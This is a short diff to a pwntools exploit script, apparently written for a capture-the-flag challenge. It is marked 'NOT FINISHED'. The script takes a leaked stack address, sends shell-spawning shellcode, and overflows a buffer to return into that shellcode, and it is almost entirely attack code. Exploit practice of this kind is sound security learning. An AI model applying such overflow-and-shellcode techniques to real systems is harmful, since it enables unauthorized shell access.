@@ -5,6 +5,7 @@ p.recuntil('I drink milk even though i\'m lactose intolerant: ')
 _ = p.recvline().strip()
 stack = int(_,16)
 p.sendline(b'' + asm(shellcraft.sh()))
+p.recv()
 p.sendline(b'' + (0x60-0x8)*b'A' + p64(stack))
 p.interactive()
 # NOT FINISHED
